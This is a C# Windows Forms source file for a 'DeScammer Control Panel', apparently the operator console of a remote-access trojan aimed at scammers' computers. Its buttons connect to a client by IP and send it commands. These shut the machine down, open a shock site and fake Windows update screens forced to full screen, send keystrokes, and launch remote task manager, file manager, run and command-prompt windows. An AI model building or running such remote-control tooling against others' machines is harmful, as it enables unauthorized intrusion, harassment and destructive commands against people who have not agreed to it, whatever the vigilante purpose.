using System;
using System.Threading;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using DeScammerControlPanel.API;

namespace DeScammerControlPanel
{
    public partial class Main : Form
    {
        #region Form Properties
        public bool IsClientConnected
        {
            get
            {
                return lblClientStatus.Text == "Connected";
            }
            set
            {
                if (value)
                {
                    if (InvokeRequired)
                    {
                        lblClientStatus.Invoke(new MethodInvoker(delegate { lblClientStatus.Text = "Connected"; }));
                        lblClientStatus.Invoke(new MethodInvoker(delegate { lblClientStatus.ForeColor = Color.Green; }));
                        btnDisconnectClient.Invoke(new MethodInvoker(delegate () { btnDisconnectClient.Enabled = true; }));
                        btnShutdownClient.Invoke(new MethodInvoker(delegate () { btnShutdownClient.Enabled = true; }));
                    }
                    else
                    {
                        lblClientStatus.Text = "Connected";
                        lblClientStatus.ForeColor = Color.Green;
                        btnDisconnectClient.Enabled = true;
                        btnShutdownClient.Enabled = true;
                    }
                }
                else
                {
                    if (InvokeRequired)
                    {
                        lblClientStatus.Invoke(new MethodInvoker(delegate { lblClientStatus.Text = "Disconnected"; }));
                        lblClientStatus.Invoke(new MethodInvoker(delegate { lblClientStatus.ForeColor = Color.Red; }));
                        btnDisconnectClient.Invoke(new MethodInvoker(delegate () { btnDisconnectClient.Enabled = false; }));
                        btnShutdownClient.Invoke(new MethodInvoker(delegate () { btnShutdownClient.Enabled = false; }));
                        this.Invoke(new MethodInvoker(delegate () { RemoveClient(); }));
                    }
                    else
                    {
                        lblClientStatus.Text = "Disconnected";
                        lblClientStatus.ForeColor = Color.Red;
                        btnDisconnectClient.Enabled = false;
                        btnShutdownClient.Enabled = false;
                        RemoveClient();
                    }
                }
            }
        }
        #endregion

        public Main()
        {
            InitializeComponent();
        }

        #region Private Functions
        private void RemoveClient()
        {
            try
            {
                Variables.Client.Disconnect(); // Try to disconnect first
            }
            catch (Exception ex) { }

            Variables.Client = null; // Set the client to null
            txtIP.ReadOnly = false; // Set the textbox to be writtable
            btnConnect.Enabled = true; // Enable connect button
            btnClear.Enabled = true; // Enable the clear button
        }
        #endregion

        #region Form Functions
        private void btnClear_Click(object sender, EventArgs e)
        {
            if (txtIP.ReadOnly)
                return; // Don't clear if it is in read only mode

            txtIP.Text = ""; // Clear the text
        }

        private void btnConnect_Click(object sender, EventArgs e)
        {
            if(Variables.Client != null && Variables.Client.IsConnected)
                return; // Client is already connected don't bother

            Variables.Client = Client.Create(txtIP.Text); // Create a client instance
            txtIP.ReadOnly = true; // Set the textbox to read only
            btnConnect.Enabled = false; // Disable the connect button
            btnClear.Enabled = false; // Disable the clear button

            if (!Variables.Client.IsConnected)
                RemoveClient(); // Restore if the client couldn't connect

            if(Variables.Client != null)
                MessageBox.Show("You are now connected!", "DeScammer Control Panel");
        }

        private void btnDisconnectClient_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null || !Variables.Client.IsConnected)
                return; // Client isn't connected don't bother

            RemoveClient();

            MessageBox.Show("You are now disconnected!", "DeScammer Control Panel");
        }

        private void btnShutdownClient_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null || !Variables.Client.IsConnected)
                return; // Client isn't connected don't bother

            Variables.Client.Send(CommandManager.FormatCommand("shutdown", new string[0]));
        }

        private void Main_Load(object sender, EventArgs e)
        {
            if(!CommandManager.IsLoaded)
                CommandManager.Load(); // Load the command manager
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Variables.Client == null || !Variables.Client.IsConnected)
                return; // Client isn't connected don't bother

            RemoveClient();
        }
        #endregion

        #region Troll Buttons - Websites
        private void btnWLeekspin_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://leekspin.com/" }));
        }

        private void btnWWin7Update_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/win7/index.html" }));
            Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
        }

        private void btnWWinXPUpdate_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/xp/index.html" }));
            Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
        }

        private void btnWWin10Update_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.Client.Send(CommandManager.FormatCommand("foregroundapp", new string[] { "chrome" }));
            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://fakeupdate.net/win10/index.html" }));
            Variables.Client.Send(CommandManager.FormatCommand("sendkey", new string[] { "{F11}" }));
        }

        private void btnWMeatspin_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.Client.Send(CommandManager.FormatCommand("processstart", new string[] { "http://meatspin.fr/" }));
        }
        #endregion

        #region Troll Buttons - Utilities
        private void btnUFakeName_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://www.fakenamegenerator.com/");
        }

        private void btnUFakeMail_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://www.fakemailgenerator.com/");
        }

        private void btnUIPLookup_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://ip-lookup.net/");
        }

        private void btnUGeolocation_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://www.infosniper.net/");
        }
        #endregion

        #region Troll Buttons - Remote Programs
        private void btnTaskManager_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.TaskManagerForm = new TaskManager();

            Variables.TaskManagerForm.Show();
        }

        private void btnRun_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.RunForm = new Run();

            Variables.RunForm.Show();
        }

        private void btnMessageBox_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.OpenMessageBoxForm = new OpenMessageBox();

            Variables.OpenMessageBoxForm.Show();
        }

        private void btnFileManager_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.FileManagerForm = new FileManager();

            Variables.FileManagerForm.Show();
        }

        private void btnCMD_Click(object sender, EventArgs e)
        {
            if (Variables.Client == null)
                return;

            Variables.CMDForm = new CMD();

            Variables.CMDForm.Show();
        }
        #endregion
    }
}
